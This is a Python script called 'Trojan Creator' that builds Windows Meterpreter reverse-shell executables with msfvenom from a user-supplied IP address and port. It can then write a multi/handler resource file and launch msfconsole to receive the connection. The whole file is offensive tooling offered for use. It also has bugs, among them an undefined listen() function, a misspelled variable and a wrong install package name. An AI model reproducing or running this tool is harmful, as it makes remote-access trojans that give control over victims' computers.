#!/usr/bin/env python
# -*- coding:utf-8 -*-

import os
import time

os.system("apt-get install figlet")
os.system("apt-get install msfvenom")
os.system("clear")
os.system("figlet Trojan Creator")
print("""

Welcome to Trojan Creator!

""")

ip = raw_input("Enter Local or Public IP:")
port = raw_input("Enter Port:")
print("""

1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https

""")
payload = raw_input("Enter Payload No:")
path = raw_input("Enter Name of File:")

if (payload == "1"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + path)
	payload_listen = "windows/meterpreter/reverse_tcp"
	print("Creating...")
	somethinginter = raw_input("Do you want to listen to trojan (y/n) :")
	if (somethinginter == "y" or somethinginter == "yes"):
		#creating file -start
		f = open("listen.txt", "a+")
		f.write("use multi/handler\n")
		f.write("set payload " + payload_listen + "\n")
		f.write("set LHOST " + ip + "\n")
		f.write("set LPORT " + port + "\n")
		f.write("exploit")
		f.close()
		#creating file -end
		os.system("msfconsole -r listen.txt")
	elif (somethinginter == "n" or somthinginter == "no"):
		os.system("figlet Thanks!")
		os.system("figlet Bye-Bye!")
	else:
		listen()
elif (payload == "2"):
	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + path)
	payload_listen = "windows/meterpreter/reverse_http"
	print("Creating...")
	somethinginter = raw_input("Do you want to listen to trojan (y/n) :")

	if (somethinginter == "y" or somethinginter == "yes"):
		f = open("listen.txt", "a+")
		f.write("use multi/handler\n")
		f.write("set payload " + payload_listen + "\n")
		f.write("set LHOST " + ip + "\n")
		f.write("set LPORT " + port + "\n")
		f.write("exploit")
		os.system("msfconsole -r listen.txt")
		f.close()
	elif (somethinginter == "n" or somthinginter == "no"):
		os.system("figlet Thanks!")
		os.system("figlet Bye-Bye!")
	else:
		listen()
elif (payload == "3"):
	os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o " + path)
	payload_listen = "windows/meterpreter/reverse_https"
	print("Creating...")
	somethinginter = raw_input("Do you want to listen to trojan (y/n) :")

	if (somethinginter == "y" or somethinginter == "yes"):
		f = open("listen.txt", "a+")
		f.write("use multi/handler\n")
		f.write("set payload " + payload_listen + "\n")
		f.write("set LHOST " + ip + "\n")
		f.write("set LPORT " + port + "\n")
		f.write("exploit")
		f.close()
		os.system("msfconsole -r listen.txt")
	elif (somethinginter == "n" or somthinginter == "no"):
		os.system("figlet Thanks!")
		os.system("figlet Bye-Bye!")
	else:
		listen()
else:
	i = 0
	while i < 20:
		print("An ERROR Occured. Program is closing!")
		i+=1
		time.sleep(0.09)

